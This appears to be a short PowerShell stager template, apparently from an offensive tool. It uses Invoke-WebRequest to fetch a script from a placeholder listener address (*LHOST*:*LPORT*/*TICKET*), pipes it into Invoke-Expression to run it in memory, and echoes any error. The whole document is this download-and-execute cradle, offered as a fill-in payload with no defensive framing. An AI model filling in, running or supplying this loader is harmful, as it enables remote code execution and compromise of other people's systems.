try {
    IWR "http://*LHOST*:*LPORT*/*TICKET*" -UseBasicParsing | IEX;
} catch {
    echo $_.Exception.Message;
}
